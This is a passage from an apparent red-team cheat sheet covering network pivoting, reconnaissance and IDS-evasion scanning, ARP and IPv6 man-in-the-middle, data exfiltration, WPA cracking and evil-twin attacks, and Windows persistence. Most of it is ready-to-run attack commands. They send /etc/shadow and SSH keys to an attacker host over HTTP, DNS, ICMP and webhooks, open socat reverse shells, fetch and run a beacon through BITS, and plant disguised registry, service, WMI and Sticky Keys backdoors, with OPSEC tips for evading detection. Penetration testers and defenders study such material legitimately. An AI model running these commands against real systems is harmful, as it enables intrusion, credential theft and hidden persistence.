
# Step 1: Setup listener on Agent A to forward to attacker proxy
ligolo-ng >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp

# Step 2: Start Agent B on Host B (connects to Host A's forwarded port)
./agent -connect $PIVOT1_IP:11601 -ignore-cert

# Step 3: In proxy console, select Agent B session
ligolo-ng >> session 2

# Step 4: Add route for Network2
sudo ip route add $NETWORK2_SUBNET dev ligolo

# Step 5: Start tunnel for session 2
ligolo-ng >> tunnel_start --tun ligolo
```

#### OPSEC Considerations

```
NOISE LEVEL: Low (looks like TLS traffic)
DETECTION VECTORS:
  - agent binary has known fingerprint → AV
  - Ligolo uses self-signed TLS by default → TLS fingerprint
  - Unusual outbound connections from servers

MITIGATIONS:
  - Use --cert and --key for valid certs
  - Rename agent binary to legitimate-looking name

EVIDENCE FOR REPORT:
  - ligolo-ng session list screenshot
  - Direct nmap/tool output against internal subnet
```

---

### 3.5 sshuttle

**Prerequisites:** SSH access to pivot; sshuttle, Python3 installed on both machines

```bash
# Route all traffic to target subnet through SSH
sshuttle -r $USERNAME@$PIVOT_HOST $INTERNAL_SUBNET

# Multiple subnets
sshuttle -r $USERNAME@$PIVOT_HOST $INTERNAL_SUBNET $INTERNAL_SUBNET2

# Include DNS (resolve internal hostnames)
sshuttle -r $USERNAME@$PIVOT_HOST $INTERNAL_SUBNET --dns

# Route everything (0.0.0.0/0) except SSH host IP
sshuttle -r $USERNAME@$PIVOT_HOST 0.0.0.0/0 --exclude $PIVOT_HOST/32

# Via SSH key
sshuttle -r $USERNAME@$PIVOT_HOST --ssh-cmd "ssh -i ~/.ssh/id_rsa" $INTERNAL_SUBNET

# Background
nohup sshuttle -r $USERNAME@$PIVOT_HOST $INTERNAL_SUBNET &

# sshuttle advantages:
# - No proxychains needed (transparent TCP proxy)
# - Handles UDP with --dns
# - Works with any tool that uses TCP
# sshuttle limitations:
# - Requires Python3 on pivot host
# - Does NOT support raw sockets (nmap -sS fails, use -sT)
```

---

### 3.6 socat

**Prerequisites:** socat binary (compile statically for dropping on targets)

```bash
# Simple TCP port forward
socat TCP-LISTEN:$LPORT,fork TCP:$INTERNAL_HOST:$INTERNAL_PORT

# C2 redirector
socat TCP4-LISTEN:443,fork TCP4:$TEAMSERVER_IP:443

# Reverse shell listener
socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/bash

# Reverse shell to attacker
socat TCP:$ATTACKER_IP:$LPORT EXEC:/bin/bash

# Encrypted relay (C2 over SSL)
# Generate cert: openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 365 -out server.crt
socat OPENSSL-LISTEN:443,cert=server.crt,key=server.key,verify=0,fork TCP:localhost:8080

# UDP relay (DNS forwarding)
socat UDP-LISTEN:53,fork UDP:$DNS_SERVER:53

# Static binary for targets (compile)
apt install socat       # or
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat \
  -O /tmp/socat && chmod +x /tmp/socat
```

---

### 3.7 netsh (Windows Port Forwarding)

```cmd
# Forward local Windows port to internal host
netsh interface portproxy add v4tov4 \
  listenport=$LPORT listenaddress=0.0.0.0 \
  connectport=$INTERNAL_PORT connectaddress=$INTERNAL_HOST

# Example: forward 0.0.0.0:3389 to internal RDP
netsh interface portproxy add v4tov4 \
  listenport=3389 listenaddress=0.0.0.0 \
  connectport=3389 connectaddress=10.10.10.100

# List all forwarders
netsh interface portproxy show all

# Remove forwarder
netsh interface portproxy delete v4tov4 listenport=$LPORT listenaddress=0.0.0.0

# Allow firewall rule
netsh advfirewall firewall add rule name="Pivot_$LPORT" \
  protocol=TCP dir=in localport=$LPORT action=allow
```

---

### 3.8 Proxychains Configuration

```bash
# /etc/proxychains4.conf

# Chain type options:
dynamic_chain    # Skip unavailable proxies (recommended)
# strict_chain   # All proxies required in order
# round_robin_chain

proxy_dns        # Resolve DNS through proxy (prevents DNS leaks)

[ProxyList]
# Primary proxy (Chisel SOCKS, SSH -D, Ligolo SOCKS)
socks5 127.0.0.1 1080

# Multi-hop (uncomment for chaining)
# socks5 127.0.0.1 2080

# Tor (anonymization layer)
# socks4 127.0.0.1 9050

# Tool usage
proxychains4 -q nmap -sT -Pn -n -p 80,443,445,3389 $INTERNAL_HOST
proxychains4 -q crackmapexec smb $INTERNAL_SUBNET -u $USERNAME -p $PASSWORD
proxychains4 -q impacket-psexec $DOMAIN/$USERNAME:$PASSWORD@$INTERNAL_HOST
proxychains4 -q python3 exploit.py $INTERNAL_HOST
proxychains4 -q curl http://$INTERNAL_HOST/
proxychains4 -f /etc/proxychains-custom.conf nmap ...    # Custom config file
```

---

### 3.9 Complete Multi-Hop Pivot Scenario

```
Scenario: Attacker → DMZ Host (192.168.1.10) → Internal Segment (10.10.10.0/24)
          → Restricted Network (172.16.0.0/16)

Step 1: Compromise DMZ Host — get shell
Step 2: Upload Ligolo agent to DMZ Host
Step 3: Start Ligolo proxy on Attacker
Step 4: Connect agent from DMZ Host to Attacker
Step 5: Add route: sudo ip route add 10.10.10.0/24 dev ligolo
Step 6: Start tunnel — now reach 10.10.10.0/24 directly

Step 7: Compromise 10.10.10.50 (Internal Host)
Step 8: Upload Ligolo agent to 10.10.10.50
Step 9: Add listener on DMZ agent to relay:
        ligolo-ng >> listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
Step 10: Connect agent from 10.10.10.50 to DMZ:11601 (which tunnels to attacker proxy)
Step 11: Select new session in ligolo-ng
Step 12: sudo ip tuntap add user $USER mode tun ligolo2 && sudo ip link set ligolo2 up
Step 13: sudo ip route add 172.16.0.0/16 dev ligolo2
Step 14: ligolo-ng >> tunnel_start --tun ligolo2

Now: nmap 172.16.0.1-254 — reaches restricted segment through double pivot
```

---

## Section 4: Network Reconnaissance

### 4.1 Host Discovery

**Prerequisites:** nmap, netdiscover, arp-scan, nbtscan, bettercap installed

#### External / ICMP Discovery

```bash
# ICMP ping sweep
nmap -sn $TARGET_RANGE -oA $OUTPUT_DIR/host_discovery
fping -g $TARGET_RANGE 2>/dev/null | grep alive

# TCP port-based discovery (when ICMP blocked)
masscan -p20,21,22,23,25,53,80,110,135,139,143,443,445,993,1433,3306,3389,5900,8080 \
  $TARGET_RANGE --rate 1000 -oL $OUTPUT_DIR/masscan_discovery.txt
```

#### Internal ARP-Based Discovery

```bash
# ARP scan (reliable on local segment)
sudo arp-scan -l                         # Local subnet auto-detect
sudo arp-scan $TARGET_RANGE -I eth0
sudo netdiscover -r $TARGET_RANGE
sudo netdiscover -p                      # Passive mode

# NetBIOS/WINS discovery
nbtscan -r $TARGET_RANGE
nbtscan -r $TARGET_RANGE -v             # Verbose (names + MACs)

# nmap ARP
nmap -sn $TARGET_RANGE                  # Uses ARP on local subnet

# Bettercap passive discovery
sudo bettercap -iface eth0
net.recon on
net.show
```

#### IPv6 Discovery

```bash
# Ping link-local all-nodes multicast
ping6 -c 3 ff02::1%eth0

# alive6
alive6 eth0

# nmap IPv6
nmap -6 -sn $IPV6_RANGE
nmap -6 -sV --script ipv6-multicast-mld-list eth0

# Get IPv6 addresses from IPv4 hosts
nmap -sV --script ipv6-node-info $TARGET_IP
```

---

### 4.2 Port Scanning Strategies

#### Fast Scan (Initial Reconnaissance)

```bash
# Top 1000 ports, service versions
nmap -sV -sC -O -T4 -n -Pn -oA $OUTPUT_DIR/fastscan $TARGET_IP

# Top 1000 + output all formats
nmap -sV -T4 -n -Pn --top-ports 1000 -oA $OUTPUT_DIR/top1000 $TARGET_IP
```

#### Full TCP Scan

```bash
# All 65535 TCP ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA $OUTPUT_DIR/fullscan $TARGET_IP

# Faster with masscan then nmap for versions
masscan -p 1-65535 $TARGET_IP --rate 10000 -oG $OUTPUT_DIR/masscan_full.txt
grep "Ports:" $OUTPUT_DIR/masscan_full.txt | awk '{print $NF}' | tr ',' '\n' | cut -d '/' -f1 | sort -u > $OUTPUT_DIR/open_ports.txt
nmap -sV -sC -Pn -p $(cat $OUTPUT_DIR/open_ports.txt | tr '\n' ',') \
  -oA $OUTPUT_DIR/nmap_versions $TARGET_IP
```

#### Stealth / IDS Evasion Scanning

```bash
# SYN stealth (default, requires root)
sudo nmap -sS $TARGET_IP

# Fragmented packets (evade simple IDS)
sudo nmap -f $TARGET_IP

# Decoy scan (spoof source IPs)
sudo nmap -D RND:10 $TARGET_IP
sudo nmap -D $DECOY_IP1,$DECOY_IP2,ME $TARGET_IP

# Slow scan (T1 = paranoid, 300s delay between probes)
sudo nmap -T1 --scan-delay 3s $TARGET_IP

# Source port manipulation (bypass source-port-based firewall rules)
sudo nmap --source-port 53 $TARGET_IP      # Pretend to be DNS
sudo nmap --source-port 80 $TARGET_IP      # Pretend to be HTTP

# IPv6 (often less monitored)
sudo nmap -6 $TARGET_IPV6
```

#### UDP Scan

```bash
# UDP top ports (slow — rate limit)
sudo nmap -sU --top-ports 100 -T4 $TARGET_IP

# Key UDP ports
sudo nmap -sU -sV -p 53,67,68,69,111,123,137,138,139,161,162,500,514,520,1900,4500 $TARGET_IP
```

---

### 4.3 Service Fingerprinting

```bash
# Deep version detection
nmap -sV --version-intensity 9 -p $PORT $TARGET_IP

# Script scanning for specific service
nmap -sV --script=smb-enum* -p 139,445 $TARGET_IP
nmap -sV --script=mysql* -p 3306 $TARGET_IP
nmap -sV --script=ldap* -p 389 $TARGET_IP
nmap -sV --script=http* -p 80,443 $TARGET_IP

# Vulnerability scripts
nmap --script vuln -p $PORT $TARGET_IP

# fingerprintx (fast, accurate, chainable)
nmap -p 80,443,445,22,8080 $TARGET_IP -oG - | \
  grep "open" | \
  fingerprintx --json > $OUTPUT_DIR/fingerprint.json
```

---

### 4.4 VLAN Enumeration and Hopping

```bash
# Check for 802.1Q trunk (DTP — Dynamic Trunking Protocol)
# yersinia DTP attack (negotiate trunk mode)
sudo yersinia -G   # GUI
sudo yersinia dtp -attack 1 -interface eth0   # CLI — send DTP joins

# Monitor for DTP frames
sudo tcpdump -i eth0 -n 'ether[12:2] == 0x2004 or ether[12:2] == 0x2900'

# Create VLAN interface after trunk negotiated
sudo modprobe 8021q
sudo ip link add link eth0 name eth0.$VLAN_ID type vlan id $VLAN_ID
sudo ip link set eth0.$VLAN_ID up
sudo dhclient eth0.$VLAN_ID   # Or assign manual IP

# Double tagging VLAN hop (native VLAN must match)
# Requires: switch uses native VLAN same as attacker's VLAN
# Tool: scapy or yersinia double-tag frame injection
```

---

### 4.5 ARP Spoofing and MITM

```bash
# Bettercap (most capable modern tool)
sudo bettercap -iface eth0

bettercap> net.recon on
bettercap> net.show
bettercap> set arp.spoof.targets $TARGET_IP
bettercap> arp.spoof on
bettercap> net.sniff on

# Capture credentials from traffic
bettercap> set net.sniff.verbose true
bettercap> set net.sniff.filter tcp and port 80

# SSL stripping
bettercap> set https.proxy.sslstrip true
bettercap> https.proxy on

# arpspoof (legacy, simple)
sudo arpspoof -i eth0 -t $VICTIM_IP $GATEWAY_IP &
sudo arpspoof -i eth0 -t $GATEWAY_IP $VICTIM_IP &
sudo echo 1 > /proc/sys/net/ipv4/ip_forward
# Now capture with tcpdump or Wireshark
```

---

### 4.6 IPv6 Attacks

```bash
# mitm6 — DHCPv6 rogue server (abuses Windows WPAD auto-discovery)
sudo mitm6 -d $DOMAIN

# Combined: mitm6 + ntlmrelayx (capture creds via IPv6 WPAD)
# Terminal 1:
sudo mitm6 -d $DOMAIN
# Terminal 2:
ntlmrelayx.py -6 -t ldaps://$DC_IP -wh fakewpad.$DOMAIN -l $OUTPUT_DIR/ldap_dump

# SLAAC abuse (rogue router advertisement)
# Send RA packets claiming to be default gateway
sudo python3 fake_ra.py --interface eth0 --prefix $IPV6_PREFIX/64

# Neighbor Discovery poisoning
sudo parasite6 eth0
```

---

## Section 5: Data Exfiltration

### 5.1 HTTP/HTTPS Exfiltration

**Prerequisites:** Outbound HTTP/S from target; attacker-controlled web server

#### Linux Exfiltration

```bash
# Basic HTTP POST
curl -X POST http://$ATTACKER_IP/collect -d @/etc/passwd
curl -X POST http://$ATTACKER_IP/collect --data-binary @/etc/shadow

# Base64 encoded (avoid binary issues)
base64 -w0 /etc/passwd | curl -X POST http://$ATTACKER_IP/collect -d @-

# Compress + send
tar czf - /home/$USERNAME/.ssh/ | curl -X POST http://$ATTACKER_IP/collect \
  -H "Content-Type: application/octet-stream" --data-binary @-

# Blend with legitimate services (often whitelisted)
# Discord webhook
curl -X POST "https://discord.com/api/webhooks/$WEBHOOK_ID/$WEBHOOK_TOKEN" \
  -H "Content-Type: multipart/form-data" \
  -F "file=@/etc/passwd"

# Slack webhook
curl -X POST "https://hooks.slack.com/services/$SLACK_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"text\": \"$(base64 -w0 /etc/passwd)\"}"
```

#### Windows Exfiltration (PowerShell)

```powershell
# PowerShell upload
(New-Object System.Net.WebClient).UploadFile("http://$ATTACKER_IP/collect", "C:\sensitive.txt")

# Invoke-WebRequest
Invoke-WebRequest -Uri "http://$ATTACKER_IP/collect" -Method POST -InFile "C:\data.txt"

# certutil base64 + upload
certutil -encode C:\secret.txt C:\encoded.b64
(New-Object System.Net.WebClient).UploadFile("http://$ATTACKER_IP/collect", "C:\encoded.b64")
```

#### Attacker Receiver Setup

```bash
# Python3 HTTP receiver
python3 -c "
import http.server
import socketserver
class Handler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(length)
        with open('/tmp/received_$(date +%s)', 'wb') as f:
            f.write(data)
        self.send_response(200)
        self.end_headers()
with socketserver.TCPServer(('0.0.0.0', 8080), Handler) as s:
    s.serve_forever()
"

# nc listener (single file)
nc -lvnp $LPORT > $OUTPUT_DIR/received_file
```

---

### 5.2 DNS Exfiltration

**Prerequisites:** Outbound DNS from target; attacker controls authoritative DNS server for `$C2_DOMAIN`

```bash
# Basic DNS exfiltration (hex split into subdomains)
# Max 63 chars per label, 253 total hostname length
xxd -p -c 16 /etc/passwd | while read line; do
  dig @$ATTACKER_IP $line.exfil.$C2_DOMAIN A
done

# Faster: nping
for chunk in $(xxd -p -c 16 /etc/passwd); do
  nping --udp -p 53 $ATTACKER_IP --data-string "${chunk}.exfil.$C2_DOMAIN"
done

# dnscat2 (full DNS C2 channel)
# On attacker (requires NS record pointing to attacker):
ruby ./dnscat2.rb $C2_DOMAIN --secret=$DNS_SECRET --no-cache
# On victim:
./dnscat2 --dns server=$ATTACKER_IP,port=53,domain=$C2_DOMAIN --secret=$DNS_SECRET

# iodine (full IP tunnel over DNS)
# On attacker:
sudo iodined -f -c -P $TUNNEL_PASS 10.0.0.1 tunnel.$C2_DOMAIN
# On victim:
sudo iodine -f -P $TUNNEL_PASS tunnel.$C2_DOMAIN
# Both get tun0 IPs: server=10.0.0.1, client=10.0.0.2

# Receive DNS queries on attacker
# Setup tcpdump to capture
sudo tcpdump -i eth0 udp port 53 -w $OUTPUT_DIR/dns_capture.pcap
# Parse exfil data:
tcpdump -r $OUTPUT_DIR/dns_capture.pcap -n 'udp dst port 53' | \
  grep -oP '[a-f0-9]+(?=\.exfil)' | xxd -r -p > $OUTPUT_DIR/exfil_data
```

#### DNS Exfiltration OPSEC

```
NOISE LEVEL: Low (DNS traffic is expected)
DETECTION VECTORS:
  - High-entropy DNS labels (hex data) → DLP detection
  - Unusual DNS query volume
  - Long DNS labels (approaching 63 chars)
  - DNS queries to non-corporate DNS servers

MITIGATIONS:
  - Use realistic-looking labels (not raw hex)
  - Spread queries over time (rate limit)
  - Use TXT record queries (more data per query)
```

---

### 5.3 ICMP Exfiltration

```bash
# Basic ICMP data exfil (4 bytes per ping)
xxd -p -c 4 /path/to/file | while read line; do
  ping -c 1 -p $line $ATTACKER_IP
done

# icmpsh (reverse shell over ICMP)
# On attacker:
sudo sysctl -w net.ipv4.icmp_echo_ignore_all=1  # Suppress ICMP replies
python icmpsh_m.py $ATTACKER_IP $TARGET_IP
# On victim (Windows):
icmpsh.exe -t $ATTACKER_IP

# Scapy receiver (capture exfil data)
sudo python3 - << 'EOF'
from scapy.all import *
received = []
def capture(pkt):
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        if len(pkt[ICMP].load) >= 4:
            received.append(pkt[ICMP].load[-4:])
            print(pkt[ICMP].load[-4:].hex(), end='', flush=True)
sniff(iface="eth0", filter="icmp", prn=capture)
EOF

# ptunnel (TCP tunnel over ICMP)
# Attacker: sudo ptunnel -x $TUNNEL_PASS
# Victim:   sudo ptunnel -p $ATTACKER_IP -lp 8080 -da $INTERNAL_HOST -dp 22 -x $TUNNEL_PASS
# Then: ssh -p 8080 localhost
```

---

### 5.4 SMB Exfiltration

```bash
# Setup Impacket SMB server on attacker
python3 /usr/share/doc/python3-impacket/examples/smbserver.py share /tmp/loot
# Or with auth:
impacket-smbserver share /tmp/loot -username $USERNAME -password $PASSWORD -smb2support

# Windows: copy to attacker SMB share
copy C:\sensitive.txt \\$ATTACKER_IP\share\
xcopy C:\secret_folder \\$ATTACKER_IP\share\secret_folder /E /H /C /I
robocopy C:\sensitive \\$ATTACKER_IP\share /E
net use \\$ATTACKER_IP\share /user:$USERNAME $PASSWORD
xcopy C:\data \\$ATTACKER_IP\share /S /E

# Linux: push via smbclient
smbclient //$ATTACKER_IP/share -N -c "put /etc/passwd passwd"
smbclient //$ATTACKER_IP/share -U $USERNAME%$PASSWORD -c "put /etc/shadow shadow"
```

---

### 5.5 Cloud Storage Exfiltration (rclone)

```bash
# Install rclone
curl https://rclone.org/install.sh | sudo bash

# Configure (interactive — creates ~/.config/rclone/rclone.conf)
rclone config    # Create "remote1" pointing to attacker S3/Dropbox/etc.

# Exfil to S3
rclone copy /etc/ remote1:attacker-bucket/loot/etc/
rclone copy C:\Users\$USERNAME\Documents remote1:attacker-bucket/loot/docs/

# Sync (keep in sync — for long-term ops)
rclone sync /home/$USERNAME remote1:attacker-bucket/home/$USERNAME

# List available remotes
rclone listremotes

# OPSEC: Rclone mimics legitimate backup tools — often not detected
# Use bucket names that look like backup operations
```

---

### 5.6 Living-off-the-Land (LOL) Exfiltration

```cmd
REM certutil — base64 encode and decode (LOLBin)
certutil -encode C:\secret.txt C:\encoded.b64
certutil -urlcache -split -f http://$ATTACKER_IP/upload C:\encoded.b64

REM BITSAdmin — background upload
bitsadmin /transfer exfil /upload http://$ATTACKER_IP/collect C:\sensitive.zip

REM PowerShell download (delivery) / upload (exfil)
(New-Object System.Net.WebClient).UploadFile("http://$ATTACKER_IP/collect", "C:\data.txt")
Invoke-WebRequest -Uri "http://$ATTACKER_IP/collect" -Method POST -Body (Get-Content "C:\data.txt")

REM expand.exe (LOLBin — decode compressed payload, also useful for exfil)
expand.exe C:\data.cab \\$ATTACKER_IP\share\data.txt
```

```bash
# Linux /dev/tcp (no tools required)
exec 3< /dev/tcp/$ATTACKER_IP/$LPORT
cat /etc/passwd >&3
cat /etc/shadow >&3
exec 3>&-

# bash heredoc exfil
while IFS= read -r line; do
  curl -s -X POST http://$ATTACKER_IP/collect \
    -d "line=$line" > /dev/null
done < /etc/passwd
```

---

### 5.7 Encrypted Exfiltration Channels

```bash
# OpenSSL encrypted transfer
# Attacker receiver:
openssl s_server -accept $LPORT -cert server.crt -key server.key -quiet \
  | tar xzf - -C /tmp/received/

# Victim:
tar czf - /sensitive/data/ | \
  openssl s_client -quiet -connect $ATTACKER_IP:$LPORT

# GPG encrypted exfil (if GPG installed on target)
gpg --encrypt --recipient $GPG_KEY_ID secret.txt
curl -X POST http://$ATTACKER_IP/collect --data-binary @secret.txt.gpg

# Steganography (embed data in image, send via HTTP)
# steghide embed
steghide embed -cf cover.jpg -ef /etc/passwd -p $STEG_PASS -sf exfil.jpg
curl -X POST http://$ATTACKER_IP/collect -F "file=@exfil.jpg"
```

---

## Section 6: Wireless Attacks

### 6.1 Prerequisites and Monitor Mode Setup

**Prerequisites:** Wireless adapter supporting monitor mode and packet injection; aircrack-ng suite, hashcat installed

```bash
# Identify wireless interfaces
iwconfig
iw dev

# Check adapter capabilities
iw list | grep "Supported interface modes" -A 10

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon

# Alternative method
sudo ip link set wlan0 down
sudo iw wlan0 set type monitor
sudo ip link set wlan0 up

# Kill interfering processes
sudo airmon-ng check kill

# Verify monitor mode
iwconfig wlan0mon
```

---

### 6.2 WPA2 Handshake Capture and Cracking

```bash
# Step 1: Scan for networks
sudo airodump-ng wlan0mon

# Step 2: Target specific AP
sudo airodump-ng -c $CHANNEL --bssid $AP_MAC -w $OUTPUT_DIR/capture wlan0mon

# Step 3: Force handshake via deauth (in separate terminal)
sudo aireplay-ng -0 10 -a $AP_MAC -c $CLIENT_MAC wlan0mon
# -0 = deauth, 10 = packets, -c = specific client (or omit for broadcast)

# Step 4: Verify handshake captured
# airodump-ng shows "WPA handshake: $AP_MAC" in top right

# Step 5: Crack with aircrack-ng
aircrack-ng -w $WORDLIST $OUTPUT_DIR/capture-01.cap

# Step 6: Convert and crack with hashcat (much faster)
hcxpcapngtool -o $OUTPUT_DIR/hash.hc22000 $OUTPUT_DIR/capture-01.pcapng
# OR for older format:
cap2hccapx $OUTPUT_DIR/capture-01.cap $OUTPUT_DIR/capture.hccapx

hashcat -m 22000 $OUTPUT_DIR/hash.hc22000 $WORDLIST
hashcat -m 22000 $OUTPUT_DIR/hash.hc22000 $WORDLIST -r /usr/share/hashcat/rules/best64.rule
```

---

### 6.3 PMKID Attack (No Client Needed)

```bash
# More reliable — doesn't require deauth/waiting for client

# Capture PMKID frames
sudo hcxdumptool -i wlan0mon -o $OUTPUT_DIR/pmkid.pcapng \
  --enable_status=1 \
  --filterlist_ap=$OUTPUT_DIR/target_bssids.txt

# Convert to hashcat format
hcxpcapngtool -o $OUTPUT_DIR/hash.hc22000 $OUTPUT_DIR/pmkid.pcapng

# Crack
hashcat -m 22000 $OUTPUT_DIR/hash.hc22000 $WORDLIST
hashcat -m 22000 $OUTPUT_DIR/hash.hc22000 $WORDLIST \
  -r /usr/share/hashcat/rules/best64.rule \
  -r /usr/share/hashcat/rules/rockyou-30000.rule
```

---

### 6.4 Evil Twin and Credential Capture

```bash
# WPA2-Personal Evil Twin (capture password via captive portal)
# hostapd-mana (full rogue AP)
# 1. Configure hostapd-mana.conf:
cat > /tmp/hostapd-mana.conf << EOF
interface=wlan0mon
driver=nl80211
ssid=$TARGET_SSID
channel=$CHANNEL
hw_mode=g
ieee80211n=1
wmm_enabled=1
mana_wpaout=/tmp/wpa.conf
mana_credout=/tmp/credentials.txt
EOF
sudo hostapd-mana /tmp/hostapd-mana.conf

# 2. Setup dnsmasq (DHCP)
cat > /tmp/dnsmasq.conf << EOF
interface=wlan0mon
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
EOF
sudo dnsmasq -C /tmp/dnsmasq.conf

# 3. Deauth clients from real AP
sudo aireplay-ng -0 0 -a $AP_MAC wlan0mon    # Continuous deauth

# WPA Enterprise Evil Twin (capture MSCHAPV2/EAP credentials)
sudo eaphammer --bssid 00:11:22:33:44:55 \
  --essid "$TARGET_ESSID" \
  --channel $CHANNEL \
  --interface wlan0mon \
  --creds \
  --auth wpa-eap

# Credentials appear in /tmp/hostapd-wpe.log
```

---

### 6.5 WPS Attacks

```bash
# Scan for WPS-enabled APs
sudo wash -i wlan0mon
sudo wash -i wlan0mon --ignore-fcs    # Ignore frame check errors

# Check for Pixie Dust vulnerability (offline WPS attack)
# Weak implementations don't properly randomize nonces
sudo reaver -i wlan0mon -b $AP_MAC -K 1 -vvv    # -K 1 = Pixie Dust only

# Standard WPS PIN brute force (slow — 10000+ guesses)
sudo reaver -i wlan0mon -b $AP_MAC -vvv
sudo reaver -i wlan0mon -b $AP_MAC --delay 5 --lock-delay 300

# Bully (alternative WPS tool)
sudo bully -b $AP_MAC -e "$TARGET_SSID" -c $CHANNEL -S -F wlan0mon
```

---

### 6.6 WPA3 SAE (Dragonblood) Attacks

```bash
# WPA3 Dragonblood — timing side-channel attack
# Requires patch to hostapd_wpe / wpa_supplicant

# Check if AP supports WPA3/WPA2 mixed mode
sudo airodump-ng wlan0mon | grep $TARGET_SSID

# If mixed mode → downgrade attack (force WPA2 connection)
# Deauth from WPA3 SSID, client may reconnect via WPA2

# Dragonslayer (exploit tool)
git clone https://github.com/vanhoefm/dragonslayer
cd dragonslayer
sudo python3 dragonslayer.py --interface wlan0mon --target-essid "$TARGET_SSID"

# Note: WPA3 adoption still low; most targets are WPA2
```

---

## Section 7: Post-Exploitation Persistence

### 7.1 Windows Persistence

**Prerequisites:** Admin/SYSTEM access on target; PowerShell execution policy bypassed

#### Registry Run Keys

```powershell
# HKCU Run (user-level, survives login)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "WindowsUpdateService" \
  /t REG_SZ \
  /d "C:\Users\$USERNAME\AppData\Local\Temp\beacon.exe" /f

# HKLM Run (system-level, requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "UpdateService" \
  /t REG_SZ \
  /d "C:\Windows\System32\malicious.exe" /f

# Winlogon (runs at logon, as SYSTEM)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" \
  /v Userinit \
  /t REG_SZ \
  /d "C:\Windows\system32\userinit.exe,C:\Windows\System32\evil.exe" /f

# Debugger hijack via Image File Execution Options
# Press Shift 5x at login = SYSTEM shell (Sticky Keys backdoor)
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" \
  /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe" /f
# Also works with: Utilman.exe (Win+U key), osk.exe

# Cleanup
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsUpdateService" /f
reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateService" /f
```

#### Scheduled Tasks

```powershell
# Create basic task (cmd.exe)
schtasks /create /sc DAILY /st 09:00 \
  /tn "WindowsUpdateCheck" \
  /tr "C:\Windows\Temp\beacon.exe" \
  /ru SYSTEM

# PowerShell-based task
$Action = New-ScheduledTaskAction -Execute "powershell.exe" \
  -Argument "-WindowStyle Hidden -enc $BASE64_PAYLOAD"
$Trigger = New-ScheduledTaskTrigger -Daily -At "9:00AM"
$Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount
$Settings = New-ScheduledTaskSettingsSet -Hidden
Register-ScheduledTask -Action $Action -Trigger $Trigger \
  -Principal $Principal -Settings $Settings -TaskName "WindowsUpdate"

# Hijack existing legitimate task
SCHTASKS /Change /tn "\Microsoft\Windows\PLA\Server Manager Performance Monitor" \
  /TR "C:\Windows\Temp\beacon.exe"

# List tasks (detection)
schtasks /query /fo LIST /v
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft\*"}

# Cleanup
schtasks /delete /tn "WindowsUpdateCheck" /f
Unregister-ScheduledTask -TaskName "WindowsUpdate" -Confirm:$false
```

#### Windows Services

```cmd
REM Create new service
sc create "WindowsDefenderUpdate" \
  binPath= "C:\Windows\Temp\beacon.exe" \
  start= auto \
  DisplayName= "Windows Defender Update"
sc start "WindowsDefenderUpdate"

REM PowerShell
New-Service -Name "WindowsDefenderUpdate" \
  -BinaryPathName "C:\Windows\Temp\beacon.exe" \
  -StartupType Automatic
Start-Service "WindowsDefenderUpdate"

REM Cleanup
sc delete "WindowsDefenderUpdate"
```

#### WMI Event Subscriptions (Fileless, Persistent)

```powershell
# WMI filter (trigger: every 60 seconds on running system)
$EventFilter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$EventFilter.Name = "WindowsUpdate"
$EventFilter.EventNameSpace = "root/cimv2"
$EventFilter.QueryLanguage = "WQL"
$EventFilter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 300"
$EventFilter.Put()

# WMI consumer (action on trigger)
$Consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$Consumer.Name = "WindowsUpdate"
$Consumer.CommandLineTemplate = "C:\Windows\Temp\beacon.exe"
$Consumer.Put()

# Bind filter to consumer
$Binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$Binding.Filter = $EventFilter
$Binding.Consumer = $Consumer
$Binding.Put()

# Detection / Cleanup
Get-WMIObject -Namespace root\Subscription -Class __EventFilter | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer | Remove-WmiObject
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding | Remove-WmiObject
```

#### BITS Jobs

```cmd
REM Create BITS job for payload download + persistence
bitsadmin /create "WindowsUpdate"
bitsadmin /addfile "WindowsUpdate" "http://$ATTACKER_IP/beacon.exe" "C:\Windows\Temp\beacon.exe"
bitsadmin /SetNotifyCmdLine "WindowsUpdate" "C:\Windows\Temp\beacon.exe" NUL
bitsadmin /SetMinRetryDelay "WindowsUpdate" 60
bitsadmin /resume "WindowsUpdate"

REM Cleanup
bitsadmin /cancel "WindowsUpdate"
del C:\Windows\Temp\beacon.exe
```

#### DLL Hijacking

```powershell
# Find DLL hijack opportunities via Process Monitor
# Filter: Operation=NAME NOT FOUND, Path ends with .dll

# Locations to check:
# 1. Application directory (writable)
# 2. System PATH directories (writable)
# 3. Current working directory

# Check write permissions on app directory
icacls "C:\Program Files\VulnerableApp\"
# If BUILTIN\Users has Write → hijack

